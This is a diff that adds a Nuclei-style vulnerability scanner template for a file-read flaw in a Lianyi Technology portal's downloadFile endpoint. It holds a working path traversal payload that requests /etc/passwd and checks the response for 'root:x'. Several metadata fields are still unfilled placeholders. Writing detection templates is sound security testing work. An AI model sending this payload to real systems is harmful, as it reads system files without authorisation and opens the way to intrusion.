@@ -1,0 +1,18 @@
+id: lianyi-poral-downloadFile
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 联奕科技-downloadFile-文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/bd-api/apiSearch/downloadFile?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
